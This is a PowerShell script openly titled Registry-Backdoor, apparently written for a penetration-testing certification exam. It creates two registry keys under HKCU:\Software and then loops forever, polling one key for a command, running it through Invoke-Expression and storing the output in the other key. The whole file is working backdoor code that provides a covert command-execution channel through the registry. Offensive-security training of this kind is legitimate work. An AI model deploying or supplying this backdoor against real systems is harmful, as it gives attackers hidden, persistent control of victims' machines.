function Registry-Backdoor
{ 
<#
.SYNOPSIS
A PowerShell script for creating a backdoor in the registry.

.DESCRIPTION
A PowerShell cmdlet script that install a malware that use windows registry to execute commands and store the output of that commands.

.PARAMETER RegInputPath
The path of the registry that contains the commands to execute.

.PARAMETER RegOutputPath
The path of the registry that contains the output of the commands executed.

.PARAMETER RegInputName
The name of the registry that contains the commands to execute.

.PARAMETER RegOutputName
The name of the registry that contains the output of the commands executed.

.PARAMETER FirstCommand
The first command that will be executed by the system.

.EXAMPLE
PS C:\> . .\Registry-Backdoor
PS C:\> Registry-Backdoor -Verbose -FirstCommand  whoami  
PS C:\> Registry-Backdoor -RegInputName OutputReg -RegOutputName OutputReg 

.LINK
https://technet.microsoft.com/es-es/library/ee176852.aspx
https://blogs.technet.microsoft.com/heyscriptingguy/2012/05/09/use-powershell-to-easily-create-new-registry-keys/

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3222
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $false)]
       [String]
       $RegInputPath = "HKCU:\Software",
       
       [Parameter(Mandatory = $false)]
       [String]
       $RegOutputPath = "HKCU:\Software",

       [Parameter(Mandatory = $false)]
       [String]
       $RegInputName = "newInput",

       [Parameter(Mandatory = $false)]
       [String]
       $RegOutputName = "newOutput",

       [Parameter(Mandatory = $false)]
       [String]
       $FirstCommand = "whoami"

)


    try
    {
        #Create Two Registries one for reading the command to execute and another for storing the command's output
        $ErrorActionPreference = "Stop"
        New-Item -Path $RegInputPath -Name $RegInputName -Value $FirstCommand
        New-Item -Path $RegOutputPath -Name $RegOutputName
        Set-Item -Path "$RegInputPath\$RegInputName" -Value "$FirstCommand"
    }
    catch
    {
        Write-Verbose "Registries already exist continuing......" 
       #Set-Item -Path $registryInputComplete -Value
    }

    finally
    {
        $ErrorActionPreference = "Continue"
        
    }


    $oldCommand = $FirstCommand

    
    while(1){
        if (Test-Path "$RegInputPath\$RegInputName"){

            $InRegPath = "$RegInputPath\$RegInputName"
            $exCommand = Get-ItemProperty -path $InRegPath
            $exCommand = $exCommand.'(default)'

            if ($oldCommand -ne $exCommand)
            {

                Write-Host "Executing $exCommand" -ForegroundColor Green
                $commandOut = Invoke-Expression -Command:$exCommand 
                Set-Item -Path "$RegOutputPath\$RegOutputName" -Value "$commandOut"
                $oldCommand = $exCommand
    
            }

            else
            {
                Write-host "Waiting for new command...." -ForegroundColor Yellow 
                
            }

        }

    Write-Verbose "sleeping 5 seconds"
    Start-Sleep -s 5
    }
}